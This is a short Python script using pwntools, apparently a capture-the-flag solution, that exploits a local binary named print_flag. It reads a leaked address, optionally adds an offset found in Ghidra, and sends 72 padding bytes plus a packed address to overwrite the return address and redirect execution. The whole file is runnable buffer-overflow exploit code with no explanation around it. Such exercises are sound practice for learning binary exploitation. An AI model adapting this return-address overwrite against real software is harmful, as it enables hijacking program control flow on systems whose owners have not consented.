import sys

from pwn import *

victim = process("./print_flag")
address = victim.recvline().split()[-1]

if len(sys.argv) > 1 and sys.argv[1] == "dyn":
    num = int(address[2:], 16)
    # Offset gathered from addresses in Ghidra
    offset = 0x004011A0 - 0x00401180
else:
    # Hardcoded version
    num = int("004011a0", 16)
    offset = 0

print("got ya at", address, num)
print(f"Sending {''.join(f'{i:02x}' for i in p64(num + offset))}")
victim.sendline(b"A" * 72 + p64(num + offset))
try:
    print(victim.recvline())
except EOFError:
    print("well fuxx")
